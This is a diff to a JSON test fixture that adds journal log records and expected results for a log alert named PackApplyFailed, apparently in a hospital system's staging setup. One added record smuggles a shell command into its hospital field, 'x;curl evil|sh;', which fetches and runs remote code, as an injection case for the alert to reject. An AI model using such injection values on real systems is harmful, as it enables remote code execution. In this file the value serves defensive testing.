@@ -1,5 +1,5 @@
 {
- "_comment": "scripts/check-logs.py: these journal entries go through the real redaction steps into a throwaway VictoriaLogs, then vmalert runs deploy/logs/alerts/ on them. 'expect' lists, per alert, the client_ip values it must fire (or wait to fire) for, and no others.",
+ "_comment": "scripts/check-logs.py: these journal entries go through the real redaction steps into a throwaway VictoriaLogs, then vmalert runs deploy/logs/alerts/ on them. 'expect' lists, per alert, the values of its key label it must fire (or wait to fire) for, and no others: client_ip, or hospital for PackApplyFailed.",
  "fixtures": [
   {
    "count": 1,
@@ -452,6 +452,175 @@
     "_UID": "0",
     "_SYSTEMD_UNIT": "docker.service"
    }
+  },
+  {
+   "count": 1,
+   "record": {
+    "MESSAGE": "ihr-packs: hospital=alpha outcome=failed",
+    "_HOSTNAME": "srv1",
+    "PRIORITY": "3",
+    "CONTAINER_NAME": "indiehr-staging-migrate-1",
+    "COM_DOCKER_COMPOSE_SERVICE": "migrate",
+    "_TRANSPORT": "journal",
+    "_COMM": "dockerd",
+    "_UID": "0",
+    "_SYSTEMD_UNIT": "docker.service"
+   }
+  },
+  {
+   "count": 1,
+   "record": {
+    "MESSAGE": "ihr-packs: hospital=beta outcome=deferred",
+    "_HOSTNAME": "srv1",
+    "PRIORITY": "3",
+    "CONTAINER_NAME": "indiehr-staging-migrate-1",
+    "COM_DOCKER_COMPOSE_SERVICE": "migrate",
+    "_TRANSPORT": "journal",
+    "_COMM": "dockerd",
+    "_UID": "0",
+    "_SYSTEMD_UNIT": "docker.service"
+   }
+  },
+  {
+   "count": 1,
+   "record": {
+    "MESSAGE": "beta: care-valuesets v1 unchanged",
+    "_HOSTNAME": "srv1",
+    "PRIORITY": "3",
+    "CONTAINER_NAME": "indiehr-staging-migrate-1",
+    "COM_DOCKER_COMPOSE_SERVICE": "migrate",
+    "_TRANSPORT": "journal",
+    "_COMM": "dockerd",
+    "_UID": "0",
+    "_SYSTEMD_UNIT": "docker.service"
+   }
+  },
+  {
+   "count": 1,
+   "record": {
+    "MESSAGE": "ihr-packs: hospital=gamma outcome=failed",
+    "_HOSTNAME": "srv1",
+    "PRIORITY": "3",
+    "CONTAINER_NAME": "indiehr-staging-migrate-1",
+    "COM_DOCKER_COMPOSE_SERVICE": "migrate",
+    "SYSLOG_IDENTIFIER": "bash",
+    "_TRANSPORT": "journal",
+    "_COMM": "bash",
+    "_UID": "1000",
+    "_SYSTEMD_UNIT": "session-1.scope"
+   }
+  },
+  {
+   "count": 1,
+   "record": {
+    "MESSAGE": "10.203.0.9 - - [12/Nov/2026:10:00:00 +0530] \"GET /api/ihr-packs: hospital=forged outcome=failed\" 404 179",
+    "_HOSTNAME": "srv1",
+    "PRIORITY": "6",
+    "_TRANSPORT": "journal",
+    "_COMM": "dockerd",
+    "_UID": "0",
+    "_SYSTEMD_UNIT": "docker.service",
+    "CONTAINER_NAME": "indiehr-staging-backend-1",
+    "COM_DOCKER_COMPOSE_SERVICE": "backend"
+   }
+  },
+  {
+   "count": 1,
+   "record": {
+    "MESSAGE": "Not Found: /api/ihr-packs: hospital=forged outcome=failed",
+    "_HOSTNAME": "srv1",
+    "PRIORITY": "4",
+    "_TRANSPORT": "journal",
+    "_COMM": "dockerd",
+    "_UID": "0",
+    "_SYSTEMD_UNIT": "docker.service",
+    "CONTAINER_NAME": "indiehr-staging-backend-1",
+    "COM_DOCKER_COMPOSE_SERVICE": "backend"
+   }
+  },
+  {
+   "count": 1,
+   "record": {
+    "MESSAGE": "ihr-packs: hospital=webforged outcome=failed",
+    "_HOSTNAME": "srv1",
+    "PRIORITY": "3",
+    "_TRANSPORT": "journal",
+    "_COMM": "dockerd",
+    "_UID": "0",
+    "_SYSTEMD_UNIT": "docker.service",
+    "CONTAINER_NAME": "indiehr-staging-backend-1",
+    "COM_DOCKER_COMPOSE_SERVICE": "backend"
+   }
+  },
+  {
+   "count": 1,
+   "record": {
+    "MESSAGE": "ihr-packs: hospital=x;curl evil|sh; outcome=failed",
+    "_HOSTNAME": "srv1",
+    "PRIORITY": "3",
+    "_TRANSPORT": "journal",
+    "_COMM": "dockerd",
+    "_UID": "0",
+    "_SYSTEMD_UNIT": "docker.service",
+    "CONTAINER_NAME": "indiehr-staging-migrate-1",
+    "COM_DOCKER_COMPOSE_SERVICE": "migrate"
+   }
+  },
+  {
+   "count": 1,
+   "record": {
+    "MESSAGE": "note: ihr-packs: hospital=prefixed outcome=failed",
+    "_HOSTNAME": "srv1",
+    "PRIORITY": "3",
+    "_TRANSPORT": "journal",
+    "_COMM": "dockerd",
+    "_UID": "0",
+    "_SYSTEMD_UNIT": "docker.service",
+    "CONTAINER_NAME": "indiehr-staging-migrate-1",
+    "COM_DOCKER_COMPOSE_SERVICE": "migrate"
+   }
+  },
+  {
+   "count": 1,
+   "record": {
+    "MESSAGE": "ihr-packs: hospital=suffixed outcome=failed (and more)",
+    "_HOSTNAME": "srv1",
+    "PRIORITY": "3",
+    "_TRANSPORT": "journal",
+    "_COMM": "dockerd",
+    "_UID": "0",
+    "_SYSTEMD_UNIT": "docker.service",
+    "CONTAINER_NAME": "indiehr-staging-migrate-1",
+    "COM_DOCKER_COMPOSE_SERVICE": "migrate"
+   }
+  },
+  {
+   "count": 1,
+   "record": {
+    "MESSAGE": "ihr-packs: hospital=delta busy: trying again in 5 s",
+    "_HOSTNAME": "srv1",
+    "PRIORITY": "3",
+    "_TRANSPORT": "journal",
+    "_COMM": "dockerd",
+    "_UID": "0",
+    "_SYSTEMD_UNIT": "docker.service",
+    "CONTAINER_NAME": "indiehr-staging-migrate-1",
+    "COM_DOCKER_COMPOSE_SERVICE": "migrate"
+   }
+  },
+  {
+   "count": 1,
+   "record": {
+    "MESSAGE": "ihr-packs: hospital=devhosp outcome=failed",
+    "_HOSTNAME": "srv1",
+    "PRIORITY": "3",
+    "_TRANSPORT": "journal",
+    "_COMM": "dockerd",
+    "_UID": "0",
+    "_SYSTEMD_UNIT": "docker.service",
+    "CONTAINER_NAME": "care-celery-1",
+    "COM_DOCKER_COMPOSE_SERVICE": "celery"
+   }
   }
  ],
  "expect": {
@@ -467,12 +636,17 @@
   ],
   "RateLimitedAddress": [
    "203.0.113.50"
+  ],
+  "PackApplyFailed": [
+   "alpha",
+   "devhosp"
   ]
  },
  "expect_state": {
   "SignInLockoutsFromAddress": "firing",
   "SignInLockoutStorm": "firing",
   "FailedSignInsFromAddress": "firing",
-  "RateLimitedAddress": "pending"
+  "RateLimitedAddress": "pending",
+  "PackApplyFailed": "firing"
  }
 }
